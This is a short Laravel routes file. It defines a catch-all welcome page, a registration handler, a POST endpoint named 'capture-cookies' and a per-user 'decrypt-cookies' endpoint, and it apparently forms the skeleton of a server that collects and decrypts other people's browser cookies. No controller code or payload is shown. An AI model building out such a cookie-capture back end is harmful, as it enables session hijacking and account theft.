<?php
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\CookieController;




Route::get('/{randomPath?}', function ($randomPath = null) {
    return view('welcome', ['randomPath' => $randomPath]);
})->name('welcome');

Route::get('/', function () {
    return view('welcome');
})->name('register.form');

Route::get('/user/{id}/decrypt-cookies', [AuthController::class, 'decryptCookies']);

// Handle registration submission
Route::post('/register', [AuthController::class, 'register'])->name('register');


Route::post('/capture-cookies', [CookieController::class, 'capture'])->name('capture-cookies');



